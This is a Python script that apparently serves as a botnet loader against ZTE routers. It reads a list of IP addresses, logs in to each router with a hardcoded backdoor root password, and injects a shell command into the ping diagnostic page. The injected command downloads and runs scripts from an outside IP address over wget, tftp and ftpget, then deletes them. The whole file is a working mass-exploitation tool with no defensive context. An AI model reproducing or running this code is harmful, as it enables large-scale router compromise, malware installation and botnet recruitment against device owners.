#! python !#
import threading, sys, time, random, socket, subprocess, re, os, base64, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *	
ips = open(sys.argv[1], "r").readlines()

login_payload = "Frm_Logintoken=4&Username=root&Password=W%21n0%26oO7."
command_payload = "&Host=;$(cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.181/katura.sh; chmod 777 katura.sh; sh katura.sh; tftp 185.244.25.181 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.244.25.181; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.244.25.181 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf katura.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *f)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit"

def run(cmd):
    subprocess.call(cmd, shell=True)

class rtek(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "[ZTE] Loading - " + self.ip
				url = "http://" + self.ip + ":8083/login.gch"
                                url2 = "http://" + self.ip + ":8083/manager_dev_ping_t.gch"
				url3 = "http://" + self.ip + ":8083/getpage.gch?pid=1001&logout=1"
                               
				requests.post(url, timeout=3, data=login_payload) # bypass auth with backdoor
				requests.post(url2, timeout=2.5, data=command_payload) # command injection in ping function
                                requests.get(url3, timeout=2.5) # logout so we dont keep the session open (it happens and its annoying)

			except Exception as e:
				pass
for ip in ips:
	try:
		n = rtek(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass
